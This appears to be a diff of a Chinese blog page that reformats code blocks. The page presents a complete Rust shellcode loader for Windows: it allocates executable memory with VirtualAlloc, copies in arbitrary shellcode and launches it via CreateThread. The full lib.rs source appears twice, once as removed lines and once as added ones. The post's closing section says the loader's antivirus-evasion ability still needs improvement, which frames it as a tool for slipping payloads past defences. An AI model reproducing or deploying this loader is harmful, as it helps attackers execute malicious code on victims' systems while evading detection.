@@ -201,19 +201,19 @@ DWORD flProtect     #该内存的初始保护属性
 };</p>
 </blockquote>
 <p>代码实现</p>
-<pre tabindex="0"><code>unsafe {
-	memory.ptr = Memory::VirtualAlloc(
-		ptr::null(),
-		//memory address to distribute
-		len,
-		//memory size
-		Memory::MEM_COMMIT | Memory::MEM_RESERVE,
-		//alloc type
-		Memory::PAGE_EXECUTE_READWRITE,
-		//protect attribute
-	) as *mut u8;
-};
-</code></pre><h3 id="createthread">CreateThread</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>	memory.ptr <span style="color:#f92672">=</span> Memory::VirtualAlloc(
+</span></span><span style="display:flex;"><span>		ptr::null(),
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//memory address to distribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		len,
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//memory size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Memory::MEM_COMMIT <span style="color:#f92672">|</span> Memory::MEM_RESERVE,
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//alloc type
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Memory::PAGE_EXECUTE_READWRITE,
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//protect attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	) <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="createthread">CreateThread</h3>
 <blockquote>
 <p>创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread</p>
 <p>HANDLE CreateThread (
@@ -226,151 +226,151 @@ LPDWORD lpThreadId           #保存新线程的id
 )</p>
 </blockquote>
 <p>代码实现</p>
-<pre tabindex="0"><code>th.handle = Threading::CreateThread(
-	ptr::null_mut(),
-	//thread protect attribute
-	0,
-	//stack attribute
-	Some(ep),
-	//pointer to thread func
-	ptr::null_mut(),
-	//prama to thread func
-	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
-	//thread create flags
-	&amp;mut th.tid,
-	//thread id
-).unwrap();
-</code></pre><h3 id="virtualfree">VirtualFree</h3>
-<pre tabindex="0"><code>VirtualFreeEx{编辑 播报
-	HANDLE hProcess, // 要释放内存所在进程的句柄
-	LPVOID lpAddress, // 区域地址
-	DWORD dwSize, // 区域大小，字节
-	DWORD dwFreeType //类型
-};
-</code></pre><p>代码实现</p>
-<pre tabindex="0"><code>Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
-</code></pre><p>lib.rs全部代码</p>
-<pre tabindex="0"><code>use std::ptr;
-use std::slice;
-use std::mem;
-use std::ffi::c_void;
-use windows::Win32::System::Memory;
-use windows::Win32::Foundation;
-use windows::Win32::Foundation::WIN32_ERROR;
-use windows::Win32::System::Threading;
-use windows::Win32::System::WindowsProgramming;
-
-pub struct DistributeMemory {
-	len: usize,
-	ptr: *mut u8,
-}
-
-impl Drop for DistributeMemory {
-	fn drop(&amp;mut self) {
-		unsafe{
-			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
-		}
-	}
-}
-
-impl DistributeMemory {
-	fn new(len: usize) -&gt; Result&lt;DistributeMemory, WIN32_ERROR&gt; {
-		let mut memory = DistributeMemory {
-			len,
-			ptr: ptr::null_mut(),
-		};
-		
-		unsafe {
-			memory.ptr = Memory::VirtualAlloc(
-				ptr::null(),
-				//memory address to distribute
-				len,
-				//memory size
-				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
-				//alloc type
-				Memory::PAGE_EXECUTE_READWRITE,
-				//protect attribute
-			) as *mut u8;
-		};
-		
-		if memory.ptr.is_null() {
-			Err( unsafe{ Foundation::GetLastError()} )
-		} else {
-			Ok(memory)
-		}
-	}
-	
-	pub fn as_slice_mut(&amp;mut self) -&gt; &amp;mut[u8] {
-		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
-	}
-	
-	pub fn as_ptr(&amp;self) -&gt; *mut u8 {
-		self.ptr
-	}
-}
-
-pub struct Thread {
-	handle: Foundation::HANDLE,
-	tid: u32,
-}
-
-impl Drop for Thread {
-	fn drop(&amp;mut self) {
-		unsafe { Foundation::CloseHandle(self.handle) };
-	}
-}
-
-impl Thread {
-	pub unsafe fn run(start: *const u8) -&gt; Result&lt;Thread, WIN32_ERROR&gt; {
-		let mut th = Thread {
-			handle: Foundation::HANDLE(0),
-			tid: 0,
-		};
-		
-		let ep: extern &#34;system&#34; fn(*mut c_void) -&gt; u32 = { std::mem::transmute(start) };
-		
-		th.handle = Threading::CreateThread(
-			ptr::null_mut(),
-			//thread protect attribute
-			0,
-			//stack attribute
-			Some(ep),
-			//pointer to thread func
-			ptr::null_mut(),
-			//prama to thread func
-			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
-			//thread create flags
-			&amp;mut th.tid,
-			//thread id
-		).unwrap();
-		
-		if th.handle == Foundation::HANDLE(0) {
-			Err(Foundation::GetLastError())
-		} else {
-			Ok(th)
-		}
-	}
-	
-	pub fn wait(&amp;self) -&gt; Result&lt;(), WIN32_ERROR&gt; {
-		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
-		if status == 0 {
-			Ok(())
-		} else {
-			Err( unsafe{Foundation::GetLastError()} )
-		}
-	}
-}
-
-pub fn run(shellcode: Vec&lt;u8&gt;) -&gt; Result&lt;(), WIN32_ERROR&gt; {
-	let mut me = DistributeMemory::new(shellcode.len())?;
-	let ms = me.as_slice_mut();
-	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
-	let t = unsafe {
-		Thread::run(me.as_ptr())
-	}?;
-	t.wait()
-}
-</code></pre><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>th.handle <span style="color:#f92672">=</span> Threading::CreateThread(
+</span></span><span style="display:flex;"><span>	ptr::null_mut(),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//thread protect attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//stack attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	Some(ep),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//pointer to thread func
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ptr::null_mut(),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//prama to thread func
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//thread create flags
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> th.tid,
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//thread id
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>).unwrap();
+</span></span></code></pre></div><h3 id="virtualfree">VirtualFree</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>VirtualFreeEx{<span style="color:#960050;background-color:#1e0010">编辑</span> <span style="color:#960050;background-color:#1e0010">播报</span>
+</span></span><span style="display:flex;"><span>	HANDLE hProcess, <span style="color:#75715e">// 要释放内存所在进程的句柄
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	LPVOID lpAddress, <span style="color:#75715e">// 区域地址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwSize, <span style="color:#75715e">// 区域大小，字节
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwFreeType <span style="color:#75715e">//类型
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>代码实现</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>Memory::VirtualFree(self.ptr <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> c_void, <span style="color:#ae81ff">0</span>, Memory::MEM_RELEASE);
+</span></span></code></pre></div><p>lib.rs全部代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::ptr;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::slice;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::mem;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::ffi::c_void;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> windows::Win32::System::Memory;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> windows::Win32::Foundation;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> windows::Win32::Foundation::WIN32_ERROR;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> windows::Win32::System::Threading;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> windows::Win32::System::WindowsProgramming;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">DistributeMemory</span> {
+</span></span><span style="display:flex;"><span>	len: <span style="color:#66d9ef">usize</span>,
+</span></span><span style="display:flex;"><span>	ptr: <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> Drop <span style="color:#66d9ef">for</span> DistributeMemory {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">drop</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsafe</span>{
+</span></span><span style="display:flex;"><span>			Memory::VirtualFree(self.ptr <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> c_void, <span style="color:#ae81ff">0</span>, Memory::MEM_RELEASE);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> DistributeMemory {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">new</span>(len: <span style="color:#66d9ef">usize</span>) -&gt; Result<span style="color:#f92672">&lt;</span>DistributeMemory, WIN32_ERROR<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> memory <span style="color:#f92672">=</span> DistributeMemory {
+</span></span><span style="display:flex;"><span>			len,
+</span></span><span style="display:flex;"><span>			ptr: <span style="color:#a6e22e">ptr</span>::null_mut(),
+</span></span><span style="display:flex;"><span>		};
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>			memory.ptr <span style="color:#f92672">=</span> Memory::VirtualAlloc(
+</span></span><span style="display:flex;"><span>				ptr::null(),
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//memory address to distribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				len,
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//memory size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				Memory::MEM_COMMIT <span style="color:#f92672">|</span> Memory::MEM_RESERVE,
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//alloc type
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				Memory::PAGE_EXECUTE_READWRITE,
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//protect attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			) <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span>;
+</span></span><span style="display:flex;"><span>		};
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> memory.ptr.is_null() {
+</span></span><span style="display:flex;"><span>			Err( <span style="color:#66d9ef">unsafe</span>{ Foundation::GetLastError()} )
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>			Ok(memory)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">as_slice_mut</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self) -&gt; <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span>[<span style="color:#66d9ef">u8</span>] {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsafe</span> { slice::from_raw_parts_mut(self.ptr, self.len) }<span style="color:#75715e">//turn pointer to mut slice
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">as_ptr</span>(<span style="color:#f92672">&amp;</span>self) -&gt; <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span> {
+</span></span><span style="display:flex;"><span>		self.ptr
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Thread</span> {
+</span></span><span style="display:flex;"><span>	handle: <span style="color:#a6e22e">Foundation</span>::HANDLE,
+</span></span><span style="display:flex;"><span>	tid: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> Drop <span style="color:#66d9ef">for</span> Thread {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">drop</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsafe</span> { Foundation::CloseHandle(self.handle) };
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> Thread {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">unsafe</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">run</span>(start: <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">u8</span>) -&gt; Result<span style="color:#f92672">&lt;</span>Thread, WIN32_ERROR<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> th <span style="color:#f92672">=</span> Thread {
+</span></span><span style="display:flex;"><span>			handle: <span style="color:#a6e22e">Foundation</span>::HANDLE(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>			tid: <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>		};
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> ep: <span style="color:#a6e22e">extern</span> <span style="color:#e6db74">&#34;system&#34;</span> <span style="color:#66d9ef">fn</span>(<span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> c_void) -&gt; <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> { std::mem::transmute(start) };
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		th.handle <span style="color:#f92672">=</span> Threading::CreateThread(
+</span></span><span style="display:flex;"><span>			ptr::null_mut(),
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//thread protect attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//stack attribute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			Some(ep),
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//pointer to thread func
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			ptr::null_mut(),
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//prama to thread func
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//thread create flags
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> th.tid,
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//thread id
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		).unwrap();
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> th.handle <span style="color:#f92672">==</span> Foundation::HANDLE(<span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			Err(Foundation::GetLastError())
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>			Ok(th)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">wait</span>(<span style="color:#f92672">&amp;</span>self) -&gt; Result<span style="color:#f92672">&lt;</span>(), WIN32_ERROR<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> status <span style="color:#f92672">=</span> <span style="color:#66d9ef">unsafe</span> { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> status <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>			Ok(())
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>			Err( <span style="color:#66d9ef">unsafe</span>{Foundation::GetLastError()} )
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">run</span>(shellcode: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>) -&gt; Result<span style="color:#f92672">&lt;</span>(), WIN32_ERROR<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> me <span style="color:#f92672">=</span> DistributeMemory::new(shellcode.len())<span style="color:#f92672">?</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> ms <span style="color:#f92672">=</span> me.as_slice_mut();
+</span></span><span style="display:flex;"><span>	ms[<span style="color:#f92672">..</span>shellcode.len()].copy_from_slice(shellcode.as_slice());
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> t <span style="color:#f92672">=</span> <span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>		Thread::run(me.as_ptr())
+</span></span><span style="display:flex;"><span>	}<span style="color:#f92672">?</span>;
+</span></span><span style="display:flex;"><span>	t.wait()
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
 <p>​	由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量.</p>
 <p>免杀功能仍须改进</p>
 
